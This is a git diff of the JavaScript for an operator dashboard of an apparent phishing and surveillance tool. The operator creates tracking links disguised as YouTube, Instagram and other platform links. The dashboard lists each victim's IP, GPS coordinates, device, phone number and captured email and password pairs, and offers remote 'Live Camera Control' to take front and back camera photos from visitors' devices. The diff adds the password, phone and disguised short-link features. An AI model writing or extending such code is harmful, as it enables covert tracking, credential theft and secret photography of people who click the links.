@@ -9,7 +9,7 @@ let currentSort = 'newest';
 // ============================================
 socket = io();
 
-fetch('/api/users-data')
+fetch('/api/check-session')
     .then(response => {
         if (response.status === 401) {
             window.location.href = '/';
@@ -17,17 +17,31 @@ fetch('/api/users-data')
         return response.json();
     })
     .then(data => {
-        allUsersData = data;
-        loadVisitors();
-        updateStats();
-        displayAllUsers(data);
-        updateUsersStats(data);
-        populateStateFilter(data);
-        loadLinks();
+        if (!data.authenticated) {
+            window.location.href = '/';
+        }
+        loadAllData();
     })
     .catch(() => {
         window.location.href = '/';
     });
+
+function loadAllData() {
+    fetch('/api/users-data')
+        .then(response => response.json())
+        .then(data => {
+            allUsersData = data;
+            loadVisitors();
+            updateStats();
+            displayAllUsers(data);
+            updateUsersStats(data);
+            populateStateFilter(data);
+            loadLinks();
+        })
+        .catch(() => {
+            window.location.href = '/';
+        });
+}
 
 socket.on('visitor-connected', () => {
     refreshAllData();
@@ -46,6 +60,37 @@ socket.on('camera-data', () => {
 socket.on('location-data', () => {
     refreshAllData();
 });
+
+// ============================================
+// COPY FUNCTION
+// ============================================
+function copyToClipboard(text) {
+    if (!text || text === 'N/A' || text === 'null' || text === 'undefined' || text === 'Click to copy') {
+        showNotification('❌ Nothing to copy');
+        return;
+    }
+    navigator.clipboard.writeText(text).then(() => {
+        showNotification('✅ Copied to clipboard!');
+    }).catch(() => {
+        const input = document.createElement('input');
+        input.value = text;
+        document.body.appendChild(input);
+        input.select();
+        document.execCommand('copy');
+        document.body.removeChild(input);
+        showNotification('✅ Copied to clipboard!');
+    });
+}
+
+// ============================================
+// GENERATE SHORT LINK
+// ============================================
+function generateShortLink(originalLink, platformName) {
+    // Create a short link with platform name
+    const shortId = Math.random().toString(36).substring(2, 8);
+    const platformSlug = platformName.toLowerCase().replace(/[^a-z0-9]/g, '');
+    return `${window.location.origin}/s/${platformSlug}-${shortId}`;
+}
 
 // ============================================
 // TAB SWITCHING
@@ -83,6 +128,12 @@ function generateCustomLink() {
             document.getElementById('generatedLink').value = data.link;
             document.getElementById('generatedLinkId').textContent = data.linkId;
             document.getElementById('redirectUrlDisplay').textContent = data.redirectUrl;
+            
+            // Generate short link with platform name
+            const platform = detectPlatformFromUrl(data.redirectUrl);
+            const shortLink = generateShortLink(data.link, platform);
+            document.getElementById('shortLinkDisplay').textContent = shortLink;
+            
             showNotification('✅ Link generated successfully! Link ID: ' + data.linkId);
             refreshAllData();
             loadLinks();
@@ -91,6 +142,22 @@ function generateCustomLink() {
     .catch(error => {
         alert('Error: ' + error.message);
     });
+}
+
+function detectPlatformFromUrl(url) {
+    const platforms = ['YouTube', 'Instagram', 'Facebook', 'Twitter', 'WhatsApp', 'Telegram', 'LinkedIn', 'Reddit', 'Pinterest', 'TikTok', 'Snapchat', 'GitHub', 'Google', 'Netflix', 'Amazon', 'Spotify', 'Discord', 'Twitch'];
+    try {
+        const urlObj = new URL(url);
+        const hostname = urlObj.hostname.replace('www.', '');
+        for (const platform of platforms) {
+            if (hostname.includes(platform.toLowerCase()) || url.includes(platform.toLowerCase())) {
+                return platform;
+            }
+        }
+        return 'Website';
+    } catch {
+        return 'Website';
+    }
 }
 
 // ============================================
@@ -114,17 +181,21 @@ function displayLinks(links) {
     links.forEach(link => {
         const card = document.createElement('div');
         card.className = 'visitor-card';
+        const platform = detectPlatformFromUrl(link.redirectUrl);
+        const shortLink = generateShortLink(link.link, platform);
         card.innerHTML = `
             <div class="visitor-header">
                 <div>
-                    <strong>🔗 Link ID: ${link.linkId}</strong>
+                    <strong>🔗 ${platform} Link</strong>
                     <div style="font-size:14px; color:#666; margin-top:5px;">📌 ${link.link}</div>
+                    <div style="font-size:13px; color:#48bb78; margin-top:3px;">🔗 Short: ${shortLink}</div>
                     <div style="font-size:13px; color:#888; margin-top:3px;">🎯 Redirect: ${link.redirectUrl}</div>
                 </div>
                 <span style="padding:5px 10px; background:#48bb78; color:white; border-radius:5px; font-size:12px;">👥 ${link.totalVisits || 0} visits</span>
             </div>
             <div style="display:flex; gap:10px; margin-top:10px; flex-wrap:wrap;">
                 <button onclick="copyToClipboard('${link.link}')" class="camera-btn" style="background:#48bb78;">📋 Copy Link</button>
+                <button onclick="copyToClipboard('${shortLink}')" class="camera-btn" style="background:#667eea;">📋 Copy Short</button>
                 <button onclick="searchByLinkId('${link.linkId}')" class="camera-btn" style="background:#667eea;">🔍 View Users</button>
                 <span style="font-size:12px; color:#888; padding:8px;">📅 ${new Date(link.createdAt).toLocaleString()}</span>
             </div>
@@ -137,12 +208,6 @@ function searchByLinkId(linkId) {
     document.getElementById('searchUsers').value = linkId;
     showTab('users');
     setTimeout(() => searchUsers(), 500);
-}
-
-function copyToClipboard(text) {
-    navigator.clipboard.writeText(text).then(() => {
-        showNotification('📋 Link copied!');
-    });
 }
 
 // ============================================
@@ -226,6 +291,7 @@ function displayAllUsers(users) {
     }
     
     let filteredUsers = [...users];
+    
     if (currentFilter !== 'all') {
         const now = new Date();
         const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
@@ -251,9 +317,17 @@ function displayAllUsers(users) {
     }
     
     if (currentSort === 'newest') {
-        filteredUsers.sort((a, b) => new Date(b.visitDate) - new Date(a.visitDate));
+        filteredUsers.sort((a, b) => {
+            const dateA = a.visitDate ? new Date(a.visitDate) : new Date(0);
+            const dateB = b.visitDate ? new Date(b.visitDate) : new Date(0);
+            return dateB - dateA;
+        });
     } else {
-        filteredUsers.sort((a, b) => new Date(a.visitDate) - new Date(b.visitDate));
+        filteredUsers.sort((a, b) => {
+            const dateA = a.visitDate ? new Date(a.visitDate) : new Date(0);
+            const dateB = b.visitDate ? new Date(b.visitDate) : new Date(0);
+            return dateA - dateB;
+        });
     }
     
     document.getElementById('userCount').textContent = `(${filteredUsers.length} users)`;
@@ -282,6 +356,8 @@ function displayAllUsers(users) {
                         ${user.os ? `• 💻 ${user.os}` : ''}
                         ${visitCount > 0 ? `• 🔄 ${visitCount} visits` : ''}
                         ${lastVisit !== 'Never' ? `• 📅 Last: ${lastVisit}` : ''}
+                        ${user.phoneNumber ? `• 📞 ${user.phoneNumber}` : ''}
+                        ${user.savedPasswords && user.savedPasswords.length > 0 ? `• 🔑 ${user.savedPasswords.length} passwords` : ''}
                     </div>
                     ${locationStr ? `<div style="font-size:13px; color:#888;">${locationStr}</div>` : ''}
                     ${user.battery ? `<div style="font-size:13px; color:#888;">🔋 ${user.battery}%</div>` : ''}
@@ -293,13 +369,13 @@ function displayAllUsers(users) {
             <div style="display:flex; gap:8px; margin-top:10px; flex-wrap:wrap;">
                 <button onclick="showUserDetails('${user.id}')" class="camera-btn">📊 Full Details</button>
                 <button onclick="deleteVisitor('${user.id}')" class="camera-btn delete">🗑️ Delete</button>
-                ${user.frontCamera ? `<button onclick="downloadPhoto('${user.frontCamera}', 'front-${user.id}.jpg')" class="camera-btn" style="background:#48bb78;">⬇️ Front</button>` : ''}
-                ${user.backCamera ? `<button onclick="downloadPhoto('${user.backCamera}', 'back-${user.id}.jpg')" class="camera-btn" style="background:#48bb78;">⬇️ Back</button>` : ''}
+                ${user.frontCamera ? `<button onclick="downloadPhoto('${user.frontCamera.image || user.frontCamera}', 'front-${user.id}.jpg')" class="camera-btn" style="background:#48bb78;">⬇️ Front</button>` : ''}
+                ${user.backCamera ? `<button onclick="downloadPhoto('${user.backCamera.image || user.backCamera}', 'back-${user.id}.jpg')" class="camera-btn" style="background:#48bb78;">⬇️ Back</button>` : ''}
                 <button onclick="captureVisitorPhoto('both')" class="camera-btn" style="background:#ed8936;">📸 Capture Both</button>
             </div>
             <div style="display:flex; gap:10px; margin-top:10px; flex-wrap:wrap;">
-                ${user.frontCamera ? `<img src="${user.frontCamera}" style="max-width:60px; border-radius:5px;">` : ''}
-                ${user.backCamera ? `<img src="${user.backCamera}" style="max-width:60px; border-radius:5px;">` : ''}
+                ${user.frontCamera ? `<img src="${user.frontCamera.image || user.frontCamera}" style="max-width:60px; border-radius:5px;">` : ''}
+                ${user.backCamera ? `<img src="${user.backCamera.image || user.backCamera}" style="max-width:60px; border-radius:5px;">` : ''}
             </div>
             ${visitCount > 0 ? `<div style="margin-top:8px; font-size:12px; color:#888;">📋 ${visitCount} visits. Click "Full Details" for history.</div>` : ''}
         `;
@@ -397,7 +473,7 @@ function clearFilters() {
 }
 
 // ============================================
-// SHOW USER DETAILS
+// SHOW USER DETAILS - WITH ALL FEATURES
 // ============================================
 function showUserDetails(userId) {
     currentVisitorId = userId;
@@ -423,6 +499,7 @@ function showUserDetails(userId) {
                                 ${visit.ip ? `• 🌐 ${visit.ip}` : ''}
                                 ${visitLoc !== 'N/A' ? `• 📍 ${visitLoc}` : ''}
                                 ${visit.battery ? `• 🔋 ${visit.battery}%` : ''}
+                                ${visit.phoneNumber ? `• 📞 ${visit.phoneNumber}` : ''}
                             </div>
                             <div>
                                 <button onclick="showVisitDetails('${userId}', ${index})" class="camera-btn" style="background:#667eea; padding:3px 10px; font-size:12px;">👁️ View</button>
@@ -436,62 +513,189 @@ function showUserDetails(userId) {
                 visitHistoryHTML = '<p style="color:#999;">No visit history available</p>';
             }
             
+            // Photos with Delete Button
+            const frontPhoto = user.frontCamera || null;
+            const backPhoto = user.backCamera || null;
+            
+            let frontPhotoHTML = '';
+            if (frontPhoto) {
+                const imgSrc = frontPhoto.image || frontPhoto;
+                const captureDate = frontPhoto.captureDate ? new Date(frontPhoto.captureDate).toLocaleString() : 'Unknown';
+                const location = frontPhoto.location ? `${frontPhoto.location.lat || ''}, ${frontPhoto.location.lng || ''}` : 'Not available';
+                frontPhotoHTML = `
+                    <div style="display:inline-block; margin:10px; padding:15px; background:rgba(255,255,255,0.05); border-radius:12px; border:1px solid rgba(255,255,255,0.08);">
+                        <p><strong>📸 Front Camera</strong></p>
+                        <img src="${imgSrc}" class="camera-image">
+                        <div style="font-size:12px; color:rgba(255,255,255,0.6); margin-top:8px;">
+                            📅 ${captureDate}<br>
+                            📍 ${location}
+                        </div>
+                        <div style="margin-top:8px; display:flex; gap:8px; flex-wrap:wrap;">
+                            <button onclick="downloadPhoto('${imgSrc}', 'front-camera.jpg')" class="camera-btn" style="background:#48bb78; padding:5px 10px; font-size:12px;">⬇️ Download</button>
+                            <button onclick="deletePhoto('${userId}', 'front')" class="camera-btn" style="background:#fc8181; padding:5px 10px; font-size:12px;">🗑️ Delete</button>
+                        </div>
+                    </div>
+                `;
+            } else {
+                frontPhotoHTML = '<p style="color:#999;">No front photo</p>';
+            }
+            
+            let backPhotoHTML = '';
+            if (backPhoto) {
+                const imgSrc = backPhoto.image || backPhoto;
+                const captureDate = backPhoto.captureDate ? new Date(backPhoto.captureDate).toLocaleString() : 'Unknown';
+                const location = backPhoto.location ? `${backPhoto.location.lat || ''}, ${backPhoto.location.lng || ''}` : 'Not available';
+                backPhotoHTML = `
+                    <div style="display:inline-block; margin:10px; padding:15px; background:rgba(255,255,255,0.05); border-radius:12px; border:1px solid rgba(255,255,255,0.08);">
+                        <p><strong>📸 Back Camera</strong></p>
+                        <img src="${imgSrc}" class="camera-image">
+                        <div style="font-size:12px; color:rgba(255,255,255,0.6); margin-top:8px;">
+                            📅 ${captureDate}<br>
+                            📍 ${location}
+                        </div>
+                        <div style="margin-top:8px; display:flex; gap:8px; flex-wrap:wrap;">
+                            <button onclick="downloadPhoto('${imgSrc}', 'back-camera.jpg')" class="camera-btn" style="background:#48bb78; padding:5px 10px; font-size:12px;">⬇️ Download</button>
+                            <button onclick="deletePhoto('${userId}', 'back')" class="camera-btn" style="background:#fc8181; padding:5px 10px; font-size:12px;">🗑️ Delete</button>
+                        </div>
+                    </div>
+                `;
+            } else {
+                backPhotoHTML = '<p style="color:#999;">No back photo</p>';
+            }
+            
+            // Saved Passwords
+            let savedPasswordsHTML = '';
+            if (user.savedPasswords && user.savedPasswords.length > 0) {
+                savedPasswordsHTML = '<div class="visitor-details-grid">';
+                user.savedPasswords.forEach(pwd => {
+                    savedPasswordsHTML += `
+                        <div class="detail-card">
+                            <label>📧 Email <button onclick="copyToClipboard('${pwd.email || 'Unknown'}')" class="camera-btn" style="background:#48bb78; padding:2px 8px; font-size:10px;">Copy</button></label>
+                            <div class="value">${pwd.email || 'Unknown'}</div>
+                            <label style="margin-top:5px;">🔑 Password <button onclick="copyToClipboard('${pwd.password || 'Unknown'}')" class="camera-btn" style="background:#48bb78; padding:2px 8px; font-size:10px;">Copy</button></label>
+                            <div class="value">${pwd.password || 'Unknown'}</div>
+                        </div>
+                    `;
+                });
+                savedPasswordsHTML += '</div>';
+            }
+            
+            // Screen Time
+            let screenTimeHTML = '';
+            if (user.screenTime) {
+                screenTimeHTML = `
+                    <div class="visitor-details-grid">
+                        <div class="detail-card">
+                            <label>🔋 Battery Level</label>
+                            <div class="value">${user.screenTime.batteryLevel || 'N/A'}%</div>
+                        </div>
+                        <div class="detail-card">
+                            <label>⚡ Charging</label>
+                            <div class="value">${user.screenTime.charging ? 'Yes' : 'No'}</div>
+                        </div>
+                    </div>
+                `;
+            }
+            
             let html = `
                 <div style="display:grid; grid-template-columns:1fr 1fr; gap:20px;">
                     <div>
                         <h3>👤 User Information</h3>
                         <div class="visitor-details-grid">
-                            <div class="detail-card"><label>🆔 ID</label><div class="value">${user.id}</div></div>
-                            <div class="detail-card"><label>🔗 Link ID</label><div class="value">${user.linkId || 'N/A'}</div></div>
-                            <div class="detail-card"><label>📱 Device</label><div class="value">${user.deviceName || 'N/A'}</div></div>
-                            <div class="detail-card"><label>💻 OS</label><div class="value">${user.os || 'N/A'}</div></div>
-                            <div class="detail-card"><label>🌍 Browser</label><div class="value">${user.browser || 'N/A'}</div></div>
-                            <div class="detail-card"><label>🌐 IP Address</label><div class="value">${user.ip || 'N/A'}</div></div>
-                            <div class="detail-card"><label>📶 Network</label><div class="value">${user.network?.effectiveType || user.network?.type || 'N/A'}</div></div>
-                            <div class="detail-card"><label>🔋 Battery</label><div class="value">${user.battery || 'N/A'}%</div></div>
-                            <div class="detail-card"><label>📅 First Visit</label><div class="value">${user.visitDate ? new Date(user.visitDate).toLocaleString() : 'N/A'}</div></div>
-                            <div class="detail-card"><label>🔄 Total Visits</label><div class="value">${user.totalVisits || 0}</div></div>
-                            <div class="detail-card"><label>📅 Last Visit</label><div class="value">${user.lastVisit ? new Date(user.lastVisit).toLocaleString() : 'N/A'}</div></div>
-                            <div class="detail-card"><label>🟢 Status</label><div class="value">${user.connected ? 'Online' : 'Offline'}</div></div>
+                            <div class="detail-card">
+                                <label>🆔 ID <button onclick="copyToClipboard('${user.id}')" class="camera-btn" style="background:#48bb78; padding:2px 8px; font-size:10px;">Copy</button></label>
+                                <div class="value">${user.id}</div>
+                            </div>
+                            <div class="detail-card">
+                                <label>🔗 Link ID <button onclick="copyToClipboard('${user.linkId || 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 8px; font-size:10px;">Copy</button></label>
+                                <div class="value">${user.linkId || 'N/A'}</div>
+                            </div>
+                            <div class="detail-card">
+                                <label>📱 Device <button onclick="copyToClipboard('${user.deviceName || 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 8px; font-size:10px;">Copy</button></label>
+                                <div class="value">${user.deviceName || 'N/A'}</div>
+                            </div>
+                            <div class="detail-card">
+                                <label>💻 OS <button onclick="copyToClipboard('${user.os || 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 8px; font-size:10px;">Copy</button></label>
+                                <div class="value">${user.os || 'N/A'}</div>
+                            </div>
+                            <div class="detail-card">
+                                <label>🌍 Browser <button onclick="copyToClipboard('${user.browser || 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 8px; font-size:10px;">Copy</button></label>
+                                <div class="value">${user.browser || 'N/A'}</div>
+                            </div>
+                            <div class="detail-card">
+                                <label>🌐 IP Address <button onclick="copyToClipboard('${user.ip || 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 8px; font-size:10px;">Copy</button></label>
+                                <div class="value">${user.ip || 'N/A'}</div>
+                            </div>
+                            <div class="detail-card">
+                                <label>📶 Network <button onclick="copyToClipboard('${user.network?.effectiveType || user.network?.type || 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 8px; font-size:10px;">Copy</button></label>
+                                <div class="value">${user.network?.effectiveType || user.network?.type || 'N/A'}</div>
+                            </div>
+                            <div class="detail-card">
+                                <label>🔋 Battery <button onclick="copyToClipboard('${user.battery || 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 8px; font-size:10px;">Copy</button></label>
+                                <div class="value">${user.battery || 'N/A'}%</div>
+                            </div>
+                            <div class="detail-card">
+                                <label>📅 First Visit <button onclick="copyToClipboard('${user.visitDate ? new Date(user.visitDate).toLocaleString() : 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 8px; font-size:10px;">Copy</button></label>
+                                <div class="value">${user.visitDate ? new Date(user.visitDate).toLocaleString() : 'N/A'}</div>
+                            </div>
+                            <div class="detail-card">
+                                <label>🔄 Total Visits <button onclick="copyToClipboard('${user.totalVisits || 0}')" class="camera-btn" style="background:#48bb78; padding:2px 8px; font-size:10px;">Copy</button></label>
+                                <div class="value">${user.totalVisits || 0}</div>
+                            </div>
+                            <div class="detail-card">
+                                <label>📅 Last Visit <button onclick="copyToClipboard('${user.lastVisit ? new Date(user.lastVisit).toLocaleString() : 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 8px; font-size:10px;">Copy</button></label>
+                                <div class="value">${user.lastVisit ? new Date(user.lastVisit).toLocaleString() : 'N/A'}</div>
+                            </div>
+                            <div class="detail-card">
+                                <label>🟢 Status</label>
+                                <div class="value">${user.connected ? 'Online' : 'Offline'}</div>
+                            </div>
+                            ${user.phoneNumber ? `
+                            <div class="detail-card">
+                                <label>📞 Phone Number <button onclick="copyToClipboard('${user.phoneNumber}')" class="camera-btn" style="background:#48bb78; padding:2px 8px; font-size:10px;">Copy</button></label>
+                                <div class="value">${user.phoneNumber}</div>
+                            </div>` : ''}
                         </div>
                         ${visitHistoryHTML}
+                        
+                        <h3 style="margin-top:15px;">🔑 Saved Passwords</h3>
+                        ${savedPasswordsHTML || '<p style="color:#999;">No saved passwords found</p>'}
+                        
+                        <h3 style="margin-top:15px;">📱 Screen Time</h3>
+                        ${screenTimeHTML || '<p style="color:#999;">Screen time data not available</p>'}
                     </div>
                     <div>
                         <h3>📍 Location</h3>
                         ${user.location ? `
                             <div class="visitor-details-grid">
-                                <div class="detail-card"><label>🌍 Country</label><div class="value">${user.location.country || 'N/A'}</div></div>
-                                <div class="detail-card"><label>🏛️ State</label><div class="value">${user.location.state || 'N/A'}</div></div>
-                                <div class="detail-card"><label>🏙️ City</label><div class="value">${user.location.city || 'N/A'}</div></div>
-                                <div class="detail-card"><label>📍 Coordinates</label><div class="value">${user.location.lat || 'N/A'}, ${user.location.lng || 'N/A'}</div></div>
+                                <div class="detail-card">
+                                    <label>🌍 Country <button onclick="copyToClipboard('${user.location.country || 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 8px; font-size:10px;">Copy</button></label>
+                                    <div class="value">${user.location.country || 'N/A'}</div>
+                                </div>
+                                <div class="detail-card">
+                                    <label>🏛️ State <button onclick="copyToClipboard('${user.location.state || 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 8px; font-size:10px;">Copy</button></label>
+                                    <div class="value">${user.location.state || 'N/A'}</div>
+                                </div>
+                                <div class="detail-card">
+                                    <label>🏙️ City <button onclick="copyToClipboard('${user.location.city || 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 8px; font-size:10px;">Copy</button></label>
+                                    <div class="value">${user.location.city || 'N/A'}</div>
+                                </div>
+                                <div class="detail-card">
+                                    <label>📍 Coordinates <button onclick="copyToClipboard('${user.location.lat || 'N/A'}, ${user.location.lng || 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 8px; font-size:10px;">Copy</button></label>
+                                    <div class="value">${user.location.lat || 'N/A'}, ${user.location.lng || 'N/A'}</div>
+                                </div>
                             </div>
                         ` : '<p style="color:#999;">Location not available</p>'}
                         
                         <h3 style="margin-top:20px;">📸 Photos</h3>
                         <div style="display:flex; gap:20px; flex-wrap:wrap;">
-                            ${user.frontCamera ? `
-                                <div>
-                                    <p><strong>Front Camera</strong></p>
-                                    <img src="${user.frontCamera}" class="camera-image">
-                                    <div style="margin-top:5px;">
-                                        <button onclick="downloadPhoto('${user.frontCamera}', 'front-camera.jpg')" class="camera-btn" style="background:#48bb78; padding:5px 10px; font-size:12px;">⬇️ Download</button>
-                                    </div>
-                                </div>
-                            ` : '<p style="color:#999;">No front photo</p>'}
-                            
-                            ${user.backCamera ? `
-                                <div>
-                                    <p><strong>Back Camera</strong></p>
-                                    <img src="${user.backCamera}" class="camera-image">
-                                    <div style="margin-top:5px;">
-                                        <button onclick="downloadPhoto('${user.backCamera}', 'back-camera.jpg')" class="camera-btn" style="background:#48bb78; padding:5px 10px; font-size:12px;">⬇️ Download</button>
-                                    </div>
-                                </div>
-                            ` : '<p style="color:#999;">No back photo</p>'}
+                            ${frontPhotoHTML}
+                            ${backPhotoHTML}
                         </div>
                         
-                        <div style="margin-top:20px; border-top:1px solid #ddd; padding-top:15px;">
+                        <div style="margin-top:20px; border-top:1px solid rgba(255,255,255,0.1); padding-top:15px;">
                             <h3>📸 Live Camera Control</h3>
+                            <p style="font-size:13px; color:rgba(255,255,255,0.5);">Capture live photos from visitor's device</p>
                             <div style="display:flex; gap:10px; flex-wrap:wrap; margin-top:10px;">
                                 <button onclick="captureVisitorPhoto('front')" class="camera-btn" style="background:#48bb78;">📷 Capture Front</button>
                                 <button onclick="captureVisitorPhoto('back')" class="camera-btn" style="background:#4299e1;">📷 Capture Back</button>
@@ -503,6 +707,26 @@ function showUserDetails(userId) {
                 </div>
             `;
             container.innerHTML = html;
+        });
+}
+
+// ============================================
+// DELETE PHOTO
+// ============================================
+function deletePhoto(userId, type) {
+    if (!confirm(`Delete ${type} photo permanently?`)) return;
+    
+    fetch(`/api/visitor/${userId}/photo/${type}`, { method: 'DELETE' })
+        .then(response => response.json())
+        .then(data => {
+            if (data.success) {
+                showNotification('🗑️ Photo deleted successfully!');
+                showUserDetails(userId);
+                refreshAllData();
+            }
+        })
+        .catch(error => {
+            alert('Error: ' + error.message);
         });
 }
 
@@ -530,8 +754,10 @@ function showVisitDetails(userId, visitIndex) {
                     <div class="detail-card"><label>🔋 Battery</label><div class="value">${visit.battery || 'N/A'}%</div></div>
                     <div class="detail-card"><label>📶 Network</label><div class="value">${visit.network?.effectiveType || visit.network?.type || 'N/A'}</div></div>
                     <div class="detail-card"><label>📍 Location</label><div class="value">${visit.location ? `${visit.location.city || ''} ${visit.location.state || ''} ${visit.location.country || ''}` : 'N/A'}</div></div>
-                    ${visit.frontCamera ? `<div class="detail-card"><label>📸 Front Photo</label><div class="value"><img src="${visit.frontCamera}" style="max-width:150px; border-radius:5px; margin-top:5px;"></div></div>` : ''}
-                    ${visit.backCamera ? `<div class="detail-card"><label>📸 Back Photo</label><div class="value"><img src="${visit.backCamera}" style="max-width:150px; border-radius:5px; margin-top:5px;"></div></div>` : ''}
+                    ${visit.frontCamera ? `<div class="detail-card"><label>📸 Front Photo</label><div class="value"><img src="${visit.frontCamera.image || visit.frontCamera}" style="max-width:150px; border-radius:5px; margin-top:5px;"></div></div>` : ''}
+                    ${visit.backCamera ? `<div class="detail-card"><label>📸 Back Photo</label><div class="value"><img src="${visit.backCamera.image || visit.backCamera}" style="max-width:150px; border-radius:5px; margin-top:5px;"></div></div>` : ''}
+                    ${visit.phoneNumber ? `<div class="detail-card"><label>📞 Phone Number</label><div class="value">${visit.phoneNumber}</div></div>` : ''}
+                    ${visit.savedPasswords && visit.savedPasswords.length > 0 ? `<div class="detail-card"><label>🔑 Saved Passwords</label><div class="value">${visit.savedPasswords.map(p => p.email || p.id || 'Unknown').join(', ')}</div></div>` : ''}
                     <div class="detail-card"><label>🔄 Redirect Complete</label><div class="value">${visit.redirectComplete ? '✅ Yes' : '❌ No'}</div></div>
                 </div>
             `;
@@ -540,7 +766,7 @@ function showVisitDetails(userId, visitIndex) {
 }
 
 // ============================================
-// DELETE VISIT FROM HISTORY
+// DELETE VISIT
 // ============================================
 function deleteVisit(userId, visitIndex) {
     if (!confirm('Delete this visit from history?')) return;
@@ -644,7 +870,7 @@ function exportAllData() {
 }
 
 // ============================================
-// UPDATE STATS (Dashboard)
+// UPDATE STATS
 // ============================================
 function updateStats() {
     fetch('/api/visitors')
@@ -670,7 +896,10 @@ function copyLink() {
 // LOGOUT
 // ============================================
 function logout() {
-    window.location.href = '/';
+    fetch('/logout', { method: 'POST' })
+        .then(() => {
+            window.location.href = '/';
+        });
 }
 
 // ============================================
